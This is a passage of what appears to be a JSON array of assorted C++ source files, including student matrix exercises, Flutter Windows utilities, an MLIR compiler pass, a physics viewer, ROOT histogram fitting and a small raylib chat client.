suppliedkey)\n{\n\tbool\t\tgotsh;\n\tDisplay\t*display=NULL;\n\tint\t\tworkspace=-1;\n\tint\t\tscreen;\n\tQString\tdisplaystr;\n\tQString\tkeystr;\n\tint\t\tcnt=0;\n\n\tthis->appName=name;\n\n\tdisplay=XOpenDisplay(NULL);\n\tif(display!=NULL)\n\t\t{\n\t\t\tworkspace=getSIWorkSpace(display);\n\t\t\tscreen=DefaultScreen(display);\n\t\t\tdisplaystr=DisplayString(display);\n\t\t}\n\telse\n\t\t{\n\t\t\tworkspace=1;\n\t\t\tscreen=0;\n\t\t\tdisplaystr=\":0.0\";\n\t\t}\n\n\tif(suppliedkey==-1)\n\t\t{\n\t\t\tkeystr=QString(\"%1%2%3%4\").arg(this->appName).arg(workspace).arg(screen).arg(displaystr);\n\t\t\tthis->key=hashFromKey(keystr);\n\t\t}\n\telse\n\t\t{\n\t\t\tthis->key=suppliedkey;\n\t\t\tkeystr=QString(\"%1%2\").arg(this->appName).arg(this->key);\n\t\t}\n\n\tthis->queueID=msgget(this->key,IPC_CREAT|0660);\n\tthis->shmKey=hashFromKey(QString(\"%1%2\").arg(keystr).arg(\"sharedmem\"));\n\tthis->shmQueueID=shmget(this->shmKey,SHSIZE,0);\n\n\tif(this->shmQueueID==-1)\n\t\t{\n\t\t\tthis->shmQueueID=shmget(this->shmKey,SHSIZE,IPC_CREAT|0600);\n\t\t\tthis->queueAddr=(char*)shmat(this->shmQueueID,NULL,SHM_W);\n\t\t\tchar\t\t*ptr=this->queueAddr;\n\t\t\tcnt=sprintf(ptr,\"%i\\n\",getpid());\n\t\t\tcnt=sprintf(ptr+=cnt,\"%s\\n\",keystr.toStdString().c_str());\n\t\t\tcnt=sprintf(ptr+=cnt,\"0x%x\\n\",this->key);\n\t\t\tcnt=sprintf(ptr+=cnt,\"%s\\n\",QString(\"%1%2\").arg(keystr).arg(\"sharedmem\").toStdString().c_str());\n\t\t}\n\telse\n\t\t{\n\t\t\tthis->running=true;\n\t\t\tthis->queueAddr=(char*)shmat(this->shmQueueID,NULL,SHM_W);\n\t\t}\n\tXCloseDisplay(display);\n}\n\nSingleInstanceClass::~SingleInstanceClass()\n{\n}\n\n\n",
    "\ufeff// lab_7_1_it.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <iomanip>\n#include <time.h>\nusing namespace std;\n\nvoid Create(int** R, const int rowCount, const int colCount, const int Low, const int High);\nvoid Print(int** R, const int rowCount, const int colCount);\nvoid Sort(int** R, const int rowCount, const int colCount);\nvoid Change(int** R, const int row1, const int row2, const int colCount);\nvoid Calc(int** R, const int rowCount, const int colCount, int& S, int& k);\n\nint main() {\n    srand((unsigned)time(NULL));\n    int Low = 4;\n    int High = 51;\n    int rowCount = 8;\n    int colCount = 5;\n\n    int** R = new int* [rowCount];\n    for (int i = 0; i < rowCount; i++)\n        R[i] = new int[colCount];\n\n    Create(R, rowCount, colCount, Low, High);\n    Print(R, rowCount, colCount);\n\n    Sort(R, rowCount, colCount);\n    Print(R, rowCount, colCount);\n\n    int S = 0;\n    int k = 0;\n    Calc(R, rowCount, colCount, S, k);\n    cout << \"S = \" << S << endl;\n    cout << \"k = \" << k << endl;\n\n    Print(R, rowCount, colCount);\n\n    for (int i = 0; i < rowCount; i++)\n        delete[] R[i];\n    delete[] R;\n\n    return 0;\n}\n\nvoid Create(int** R, const int rowCount, const int colCount, const int Low, const int High) {\n    for (int i = 0; i < rowCount; i++)\n        for (int j = 0; j < colCount; j++)\n            R[i][j] = Low + rand() % (High - Low + 1);\n}\n\nvoid Print(int** R, const int rowCount, const int colCount) {\n    cout << endl;\n    for (int i = 0; i < rowCount; i++) {\n        for (int j = 0; j < colCount; j++)\n            cout << setw(4) << R[i][j];\n        cout << endl;\n    }\n    cout << endl;\n}\n\nvoid Sort(int** R, const int rowCount, const int colCount) {\n    for (int i0 = 0; i0 < rowCount - 1; i0++)\n        for (int i1 = 0; i1 < rowCount - i0 - 1; i1++)\n            if ((R[i1][0] > R[i1 + 1][0]) ||\n                (R[i1][0] == R[i1 + 1][0] && R[i1][1] < R[i1 + 1][1]) ||\n                (R[i1][0] == R[i1 + 1][0] && R[i1][1] == R[i1 + 1][1] && R[i1][2] < R[i1 + 1][2]))\n                Change(R, i1, i1 + 1, colCount);\n}\n\nvoid Change(int** R, const int row1, const int row2, const int colCount) {\n    int tmp;\n    for (int j = 0; j < colCount; j++) {\n        tmp = R[row1][j];\n        R[row1][j] = R[row2][j];\n        R[row2][j] = tmp;\n    }\n}\n\nvoid Calc(int** R, const int rowCount, const int colCount, int& S, int& k) {\n    S = 0;\n    k = 0;\n    for (int i = 0; i < rowCount; i++) {\n        for (int j = 0; j < colCount; j++) {\n\n            if (!(R[i][j] % 2 != 0 || (i % 3 == 0 && j % 3 == 0))) {\n                S += R[i][j];\n                k++;\n                R[i][j] = 0;\n            }\n        }\n    }\n}\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  unsigned int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "//===- EmitDeduplication.cpp - Impl. of emit deduplication ------*- C++ -*-===//\n//\n// Licensed under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"substrait-mlir/Dialect/Substrait/Transforms/Passes.h\"\n\n#include \"mlir/IR/Dominance.h\"\n#include \"mlir/IR/PatternMatch.h\"\n#include \"mlir/Transforms/CSE.h\"\n#include \"mlir/Transforms/GreedyPatternRewriteDriver.h\"\n#include \"substrait-mlir/Dialect/Substrait/IR/Substrait.h\"\n\nnamespace mlir::substrait {\n#define GEN_PASS_DEF_SUBSTRAITEMITDEDUPLICATIONPASS\n#include \"substrait-mlir/Dialect/Substrait/Transforms/Passes.h.inc\"\n} // namespace mlir::substrait\n\nusing namespace llvm;\nusing namespace mlir;\nusing namespace mlir::substrait;\n\nnamespace {\n\nstruct SubstraitEmitDeduplicationPass\n    : substrait::impl::SubstraitEmitDeduplicationPassBase<\n          SubstraitEmitDeduplicationPass> {\n  using substrait::impl::SubstraitEmitDeduplicationPassBase<\n      SubstraitEmitDeduplicationPass>::SubstraitEmitDeduplicationPassBase;\n\n  void runOnOperation() override;\n};\n\nvoid SubstraitEmitDeduplicationPass::runOnOperation() {\n  mlir::RewritePatternSet patterns(&getContext());\n  populateEmitDeduplicationPatterns(patterns);\n  if (failed(mlir::applyPatternsAndFoldGreedily(getOperation(),\n                                                std::move(patterns)))) {\n    Location loc = getOperation()->getLoc();\n    emitError(loc) << \"emit deduplication: pattern application failed\";\n    signalPassFailure();\n  }\n}\n\n/// If the given `input` was produced by an `emit` op with duplicates, creates a\n/// new `emit` op without duplicates and returns the result of the new `emit`.\n/// Otherwise, i.e., if the `input` was not produced by an `emit` op or that op\n/// did not have duplicates, returns the original `input`. In both cases, also\n/// populates `reverseMapping` with the mapping that re-establishes the original\n/// order of the fields from the deduplicated order and returns the number of\n/// fields after deduplication and whether the `input` was deduplicated.\nstd::tuple<Value, int64_t, bool>\ncreateDeduplicatingEmit(Value input, SmallVector<int64_t> &reverseMapping,\n                        PatternRewriter &rewriter) {\n  // Handles the bases cases where the input either has no `emit` op or an\n  // `emit` op with no duplicates. In that case, the returned value is just the\n  // `input` and the reverse mapping is just the identity.\n  auto handleNoDuplicates = [&]() {\n    int64_t numInputFields = cast<TupleType>(input.getType()).getTypes().size();\n    for (auto i : seq(numInputFields))\n      reverseMapping.push_back(i);\n    return std::tuple<Value, int64_t, bool>{input, numInputFields, false};\n  };\n\n  // Input is not an 'emit' op: handle base case.\n  auto emitOp = llvm::dyn_cast_if_present<EmitOp>(input.getDefiningOp());\n  if (!emitOp)\n    return handleNoDuplicates();\n\n  // Compute the new mapping without duplicates as well as, for each position in\n  // the old mapping, the position in the new mapping.\n  ArrayAttr oldInputMapping = emitOp.getMapping();\n  SmallVector<int64_t> newInputMapping;\n  SmallVector<int64_t> oldToNewInputMapping;\n  {\n    llvm::DenseMap<int64_t, int64_t> indexPositions;\n    oldToNewInputMapping.reserve(oldInputMapping.size());\n    for (auto [i, attr] : enumerate(oldInputMapping)) {\n      int64_t index = cast<IntegerAttr>(attr).getInt();\n      auto [it, success] = indexPositions.try_emplace(index, i);\n      if (success)\n        newInputMapping.push_back(index);\n      oldToNewInputMapping.push_back(it->second);\n    }\n  }\n\n  // If the new and old input mappings have the same size, then there are no\n  // duplicates, so we handle it as a base case.\n  if (newInputMapping.size() == oldInputMapping.size())\n    return handleNoDuplicates();\n\n  // Compute the mapping that re-establishes the original emit order.\n  reverseMapping.reserve(reverseMapping.size() + newInputMapping.size());\n  {\n    // Compute the reverse mapping of the input.\n    SmallVector<int64_t> reverseInputMapping(oldInputMapping.size());\n    for (auto [i, index] : enumerate(newInputMapping))\n      reverseInputMapping[index] = i;\n\n    // The first fields of the reverse mapping reverse the effect of the\n    // deduplication of the emit op on the input.\n    for (auto [i, attr] :\n         enumerate(oldInputMapping.getAsRange<IntegerAttr>())) {\n      int64_t reverseIndex = reverseInputMapping[attr.getInt()];\n      reverseMapping.push_back(reverseIndex);\n    }\n  }\n\n  // If we did have duplicates, add an `emit` op that deduplicates the input.\n  Location loc = emitOp.getLoc();\n  ArrayAttr newInputMappingAttr = rewriter.getI64ArrayAttr(newInputMapping);\n  auto newEmitOp =\n      rewriter.create<EmitOp>(loc, emitOp.getInput(), newInputMappingAttr);\n\n  return {newEmitOp, newInputMapping.size(), true};\n}\n\n/// Deduplicates the fields of ",
    "/*\r\nInput:\r\n4\r\n1 4 5 7\r\n4\r\n4 6 8 10\r\nOutput:\r\n1 5\r\n5 7\r\n7 X\r\n7 X\r\nChiamo v la sequenza e x l'elemento fornito.\r\nint findLeftValue(vector<int>& v, int x, int pos)\r\nSe v[pos] >= x, ritorna findLeftValue(v, x, pos - 1)\r\nSe v[pos] < x, ritorna v[pos]\r\nSe non esiste l'elemento cercato (pos < 0), ritorna -1 (fallimento)\r\nint findRightValue(vector<int>& v, int x, int pos)\r\nSe v[pos] <= x, ritorna findRightValue(v, x, pos + 1)\r\nse v[pos] > x, ritorna v[pos]\r\nSe non esiste l'elemento cercato (pos >= v.size()), ritorna -1 (fallimento)\r\nIl caso peggiore e' quello di fallimento, e richiede lo scorrimento di tutta \r\nla sequenza. Quindi, la complessita' e' O(n).\r\n*/\r\n#include <vector>\r\n#include <iostream>\r\n#include <string>\r\n\r\nint findLeftValue(const std::vector<int>& v, int x, int pos) {\r\n    if (pos < -0) {\r\n        return -1;\r\n    }\r\n    \r\n    if (v[pos] >= x) {\r\n        return findLeftValue(v, x, pos - 1);\r\n    } else {\r\n        return v[pos];\r\n    }\r\n}\r\n\r\nint findLeftValue(const std::vector<int>& v, int x) {\r\n    return findLeftValue(v, x, v.size() - 1);\r\n}\r\n\r\nint findRightValue(const std::vector<int>& v, int x, int pos) {\r\n    if (pos >= v.size()) {\r\n        return -1;\r\n    }\r\n    \r\n    if (v[pos] <= x) {\r\n        return findRightValue(v, x, pos + 1);\r\n    } else {\r\n        return v[pos];\r\n    }\r\n}\r\n\r\nint findRightValue(const std::vector<int>& v, int x) {\r\n    return findRightValue(v, x, 0);\r\n}\r\n\r\nint main() {\r\n    int vLenght;\r\n    std::cin >> vLenght;\r\n    std::vector<int> v(vLenght);\r\n    \r\n    for (auto& elem : v) {\r\n        std::cin >> elem;\r\n    }\r\n    \r\n    int xLenght;\r\n    std::cin >> xLenght;\r\n    std::vector<int> xx(xLenght);\r\n    \r\n    for (auto& x : xx) {\r\n        std::cin >> x;\r\n    }\r\n\r\n    for (auto x : xx) {\r\n        auto leftValue = findLeftValue(v, x);\r\n        auto leftValueString = leftValue > 0 ? std::to_string(leftValue) \r\n            : \"X\";\r\n            \r\n        auto rightValue = findRightValue(v, x);\r\n        auto rightValueString = rightValue > 0 ? \r\n            std::to_string(rightValue) : \"X\";\r\n        \r\n        std::cout << leftValueString << \" \" << rightValueString << \"\\n\";\r\n    }\r\n}",
    "#include <madrona/viz/viewer.hpp>\n#include <madrona/render/render_mgr.hpp>\n#include <madrona/window.hpp>\n\n#include \"sim.hpp\"\n#include \"mgr.hpp\"\n\n#include <filesystem>\n#include <fstream>\n#include <imgui.h>\n\n#include <stb_image_write.h>\n\nusing namespace madrona;\nusing namespace madrona::viz;\n\nint main(int argc, char *argv[])\n{\n    using namespace madPhysics;\n\n    uint32_t num_worlds = 1;\n    madrona::ExecMode exec_mode = madrona::ExecMode::CPU;\n\n    if (argc < 3) {\n        printf(\"./stick_viewer [cpu|cuda] [num_worlds]\\n\");\n        return -1;\n    } else {\n        if (!strcmp(argv[1], \"cuda\")) {\n            exec_mode = madrona::ExecMode::CUDA;\n        } else if (!strcmp(argv[1], \"cpu\")) {\n            exec_mode = madrona::ExecMode::CPU;\n        } else {\n            FATAL(\"Invalid exec mode\\n\");\n        }\n\n        num_worlds = std::stoi(argv[2]);\n    }\n\n    WindowManager wm {};\n    WindowHandle window = wm.makeWindow(\"Stick Viewer\", \n            2730, 1536);\n\n    render::GPUHandle render_gpu = wm.initGPU(0, { window.get() });\n\n    // Create the simulation manager\n    Manager mgr({\n        .execMode = exec_mode,\n        .gpuID = 0,\n        .numWorlds = num_worlds,\n        .randSeed = 5,\n        .extRenderAPI = wm.gpuAPIManager().backend(),\n        .extRenderDev = render_gpu.device(),\n    });\n\n    float camera_move_speed = 10.f;\n\n    // Create the viewer viewer\n    viz::Viewer viewer(mgr.getRenderManager(), window.get(), {\n        .numWorlds = num_worlds,\n        .simTickRate = 60,\n        .cameraMoveSpeed = camera_move_speed * 7.f,\n        .cameraPosition = { 41.899895f, -57.452969f, 33.152081f },\n        .cameraRotation = { 0.944346f, -0.054453f, -0.018675f, 0.323878f },\n    });\n\n    // Main loop for the viewer viewer\n    viewer.loop(\n        [&mgr](CountT /* world_idx */, const Viewer::UserInput &/* input */) {\n            // No input\n        }\n        , [&mgr](CountT /* world_idx */, CountT /* agent_idx */,\n               const Viewer::UserInput & /* input */) {\n            // No input\n        }, [&]() {\n            mgr.step();\n        }, [&]() {\n            // No ImGui windows for now\n        });\n}\n",
    "\ufeff// lab_7_2_rek.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <iomanip>\n#include <ctime>\nusing namespace std;\n\nvoid Create(int** a, const int rowCount, const int colCount, const int Low, const int High, int i, int j);\nvoid Print(int** a, const int rowCount, const int colCount, int i);\nvoid MinRow(int** a, const int rowNo, const int colCount, int colNo, int& min);\nvoid MaxMinRows(int** a, const int rowCount, const int colCount, int rowNo, int& max);\n\nint main() {\n    srand(static_cast<unsigned>(time(nullptr)));\n    int Low = 1;\n    int High = 100;\n    int rows, cols;\n\n    cout << \"Enter number of rows (k): \";\n    cin >> rows;\n    cout << \"Enter number of columns (n): \";\n    cin >> cols;\n\n\n    int** a = new int* [rows];\n    for (int i = 0; i < rows; i++)\n        a[i] = new int[cols];\n\n    // Create the matrix\n    Create(a, rows, cols, Low, High, 0, 0);\n    cout << \"Generated Matrix:\" << endl;\n    Print(a, rows, cols, 0);\n\n\n    int max;\n    MaxMinRows(a, rows, cols, 0, max);\n    cout << \"Largest of the minimum elements from each row = \" << max << endl;\n\n\n    for (int i = 0; i < rows; i++)\n        delete[] a[i];\n    delete[] a;\n    cin.get();\n    return 0;\n}\n\nvoid Create(int** a, const int rowCount, const int colCount, const int Low, const int High, int i, int j) {\n    a[i][j] = Low + rand() % (High - Low + 1);\n    if (j < colCount - 1)\n        Create(a, rowCount, colCount, Low, High, i, j + 1);\n    else if (i < rowCount - 1)\n        Create(a, rowCount, colCount, Low, High, i + 1, 0);\n}\n\nvoid Print(int** a, const int rowCount, const int colCount, int i) {\n    if (i < rowCount) {\n        for (int j = 0; j < colCount; j++)\n            cout << setw(4) << a[i][j];\n        cout << endl;\n        Print(a, rowCount, colCount, i + 1);\n    }\n}\n\nvoid MinRow(int** a, const int rowNo, const int colCount, int colNo, int& min)\n{\n    if (a[rowNo][colNo] < min)\n        min = a[rowNo][colNo];\n    if (colNo < colCount - 1)\n        MinRow(a, rowNo, colCount, colNo + 1, min);\n}\n\nvoid MaxMinRows(int** a, const int rowCount, const int colCount, int rowNo, int& max) {\n    int min = a[rowNo][0];\n    MinRow(a, rowNo, colCount, 1, min);\n    if (rowNo == 0)\n        max = min;\n    if (min > max)\n        max = min;\n    if (rowNo < rowCount - 1)\n        MaxMinRows(a, rowCount, colCount, rowNo + 1, max);\n}\n",
    "#include <TCanvas.h>\n#include <TF1.h>\n#include <TFile.h>\n#include <TH1.h>\n#include <iostream>\n\nvoid CheckHistogram()\n{\n  TFile* file = TFile::Open(\"particle_simulation.root\", \"READ\");\n\n  TH1F* hParticles                = (TH1F*)file->Get(TString(\"h0\"));\n  TH1F* hPhi                      = (TH1F*)file->Get(TString(\"h1\"));\n  TH1F* hTheta                    = (TH1F*)file->Get(TString(\"h2\"));\n  TH1F* hImpulse                  = (TH1F*)file->Get(TString(\"h3\"));\n  TH1F* hTransvImpulse            = (TH1F*)file->Get(TString(\"h4\"));\n  TH1F* hEnergy                   = (TH1F*)file->Get(TString(\"h5\"));\n  TH1F* hInvMass                  = (TH1F*)file->Get(TString(\"h6\"));\n  TH1F* hInvMassSameCharge        = (TH1F*)file->Get(TString(\"h7\"));\n  TH1F* hInvMassOppositeCharge    = (TH1F*)file->Get(TString(\"h8\"));\n  TH1F* hInvMassPiKSameCharge     = (TH1F*)file->Get(TString(\"h9\"));\n  TH1F* hInvMassPiKOppositeCharge = (TH1F*)file->Get(TString(\"h10\"));\n  TH1F* hInvMassKStar             = (TH1F*)file->Get(TString(\"h11\"));\n\n  double nEntrieshParticle       = hParticles->GetEntries();\n  double nEntrieshPhi            = hPhi->GetEntries();\n  double nEntrieshTheta          = hTheta->GetEntries();\n  double nEntrieshImpulse        = hImpulse->GetEntries();\n  double nEntrieshTransvImpulsee = hTransvImpulse->GetEntries();\n  double nEntrieshEnergy         = hEnergy->GetEntries();\n  double nEntrieshInvMass        = hInvMass->GetEntries();\n\n  for (int bin = 1; bin < hParticles->GetNbinsX(); ++bin) {\n    double content = hParticles->GetBinContent(bin);\n    double error   = hParticles->GetBinError(bin);\n  }\n\n  TF1* phiUniformFit = new TF1(\"phiUniformFit\", \"1/([1]-[0])\", hPhi->GetXaxis()->GetXmin(),\n                               hPhi->GetXaxis()->GetXmax());\n  hPhi->Fit(\"phiUniformFit\");\n  std::cout << \"\\n Fit hPhi:\\n \" << \"Parameter a: \" << phiUniformFit->GetParameter(0) << \"\\n\"\n            << \"Parameter b: \" << phiUniformFit->GetParameter(1) << \"\\n\";\n  std::cout << \"Parameter a  fit - expected: \" << phiUniformFit->GetParameter(0) << \"\\n\"\n            << \"Parameter b fit - expected: \" << phiUniformFit->GetParameter(1) - 2 * M_PI\n            << \"\\n\";\n  std::cout << \"Reduced Chisquare: \"\n            << phiUniformFit->GetChisquare() / phiUniformFit->GetNDF();\n  std::cout << \"Probabilit\u00e0 del fit = \" << phiUniformFit->GetProb() << \"\\n\";\n\n  TF1* thetaUniformFit = new TF1(\"thetaUniformFit\", \"1/([1]-[0])\",\n                                 hTheta->GetXaxis()->GetXmin(), hTheta->GetXaxis()->GetXmax());\n  hTheta->Fit(\"thetaUniformFit\");\n  std::cout << \"\\n \\n Fit hPhi:\\n \" << \"Parameter a: \" << thetaUniformFit->GetParameter(0)\n            << \"\\n\"\n            << \"Parameter b: \" << thetaUniformFit->GetParameter(1) << \"\\n\";\n  std::cout << \"Parameter a  fit - expected: \" << thetaUniformFit->GetParameter(0) << \"\\n\"\n            << \"Parameter b fit - expected: \" << thetaUniformFit->GetParameter(1) - M_PI\n            << \"\\n\";\n  std::cout << \"Reduced Chisquare: \"\n            << thetaUniformFit->GetChisquare() / thetaUniformFit->GetNDF();\n  std::cout << \"Fit probability = \" << thetaUniformFit->GetProb() << \"\\n\";\n\n  TF1* impulseExpFit =\n      new TF1(\"impulseExpFit\", \"[0]*exp(-x/[1])\", hImpulse->GetXaxis()->GetXmin(),\n              hImpulse->GetXaxis()->GetXmax());\n  hImpulse->Fit(\"impulseExpFit\");\n  std::cout << \"\\n\\n Fit hImpulse: \\n\"\n            << \"Mean: \" << hImpulse->GetMean() << \" +/- \" << hImpulse->GetMeanError() << \"\\n\";\n  double meanDiff = hImpulse->GetMean() - 1;\n  if (meanDiff <= hImpulse->GetMeanError()) {\n    std::cout << \"Mean is COMPATIBLE with 1, with a difference of: \" << meanDiff << \"\\n\";\n  } else {\n    std::cout << \"Mean is INCOMPATIBLE with 1, with a difference of: \" << meanDiff << \"\\n\";\n  }\n\n  std::cout << \"Parameter c: \" << impulseExpFit->GetParameter(0) << \"\\n\"\n            << \"Parameter tau: \" << impulseExpFit->GetParameter(1) << \"\\n\";\n  std::cout << \"Reduced Chisquare: \"\n            << impulseExpFit->GetChisquare() / impulseExpFit->GetNDF();\n  std::cout << \"Fit probability = \" << impulseExpFit->GetProb() << \"\\n\";\n\n  hInvMassSameCharge->Sumw2();\n  hInvMassOppositeCharge->Sumw2();\n  hInvMassPiKSameCharge->Sumw2();\n  hInvMassPiKOppositeCharge->Sumw2();\n\n  TH1F* hSubtraction1 = new TH1F(\n      \"hS1\", \"Invariant Mass: subtraction between opposite and same charge\", 1000, -0.3, 6.5);\n  hSubtraction1->Add(hInvMassOppositeCharge, hInvMassSameCharge, 1, -1);\n\n  TH1F* hSubtraction2 =\n      new TH1F(\"hS2\", \"Invariant Mass: subtraction between Pi and K\", 1000, -0.3, 6.5);\n  hSubtraction2->Add(hInvMassPiKOppositeCharge, hInvMassPiKSameCharge, 1, -1);\n\n  // disegno per comparare i picchi\n  TCanvas* pickComparison = new TCanvas(\"pickComparison\", \"Invariant Mass Analisys\", 800, 600);\n  pickComparison->Divide(1, 3);\n  pickComparison->cd(2);\n  hInvMassKStar->Draw();\n\n  TF1* fitGauss1 = new TF1(\"fitGauss1\", \"gaus\", hSubtraction1->GetXaxis()->GetXmin(),\n                           hSubtraction1->GetXaxis()->GetXmax());\n\n  fitGauss1->SetParameter(1, hInvMassKStar",
    "#pragma once\n\n/*\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500*/\n\nnamespace rl { namespace scene {\n\n    void scene_0( ptr_t<Scene> self ) {\n\n        struct NODE {\n            string_t Message = string_t( UNBFF_SIZE, '\\0' );\n            string_t Response, FullMessage;\n        };  ptr_t<NODE> obj = new NODE();\n\n    /*.........................................................................*/\n\n        event_t<string_t> onGPT; onGPT.on([=]( string_t message ){\n            \n            fetch_t args; ssl_t ssl; args.method = \"POST\";\n                    args.url    = regex::format(\"${0}?key=${1}\",process::env::get(\"URL\"),process::env::get(\"API\"));\n\n                    args.body   = json::stringify( object_t({\n                        { \"contents\", array_t<object_t>({ object_t({\n                            { \"parts\", array_t<object_t>({ object_t({\n                                { \"text\", message }\n                            }) }) }\n                        }) }) }\n                    }) );\n                    \n                    args.headers= header_t({\n                        { \"Content-Type\", path::mimetype(\".json\") },\n                        { \"Host\", url::hostname( args.url ) }\n                    });\n\n            https::fetch( args, &ssl )\n\n            .then([=]( https_t cli ){\n                try {\n                auto raw = stream::await( cli ); // console::log( raw );\n                auto req = json::parse( regex::replace_all( raw, \"\\\\\\\\\\\"|*\", \"\" ) );\n                auto data= req[\"candidates\"][0][\"content\"][\"parts\"][0][\"text\"].as<string_t>();\n                     data= regex::replace_all( data, \"\\\\\\\\n\", \"\\n\" ); \n                     obj->FullMessage = data; obj->Response.clear();\n                } catch(...) { \n                    obj->FullMessage = \"Something Went Wrong\"; \n                    obj->Response.clear(); \n                }\n            })\n\n            .fail([=]( except_t err ){ console::log( err ); });\n\n        });\n\n    /*.........................................................................*/\n\n        self->onDraw([=](){\n\n            float w = GetRenderWidth(), h = GetRenderHeight(); ClearBackground( RAYWHITE );\n\n            GuiDrawText( obj->Response.get(), { 2*w/100, 2*h/100, 96*w/100, 95*h/100 }, 0, BLACK ); \n\n            GuiTextBox( { 0, 95*h/100, 88*w/100, 5*h/100 }, obj->Message.get(), obj->Message.size(), true );\n\n            if( GuiButton( { 88*w/100, 95*h/100, 12*w/100, 5*h/100 }, \"Send\" ) ){\n                onGPT.emit( obj->Message.copy() );  obj->Message.fill( '\\0' );\n            }\n\n        });\n\n    /*.........................................................................*/\n\n        self->onLoop([=]( float delta ){ [=](){\n            static uint x = 0; static ulong y = 0;\n        coStart\n\n            while( y != obj->FullMessage.size() && !obj->FullMessage.empty() ){\n               if( obj->FullMessage[ obj->Response.size() ]=='\\n' ){ x=0; }\n               if( x >= 149 ){ obj->Response.push('\\n'); x=0; } \n                obj->Response.push( obj->FullMessage[y] );\n                x++; y++; coNext;\n            }   x=0; y=0;\n\n            while( !obj->Response.empty() ){ coNext; }\n            \n        coStop\n        }(); });\n\n    }\n\n}}\n\n/*\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500*/\n",
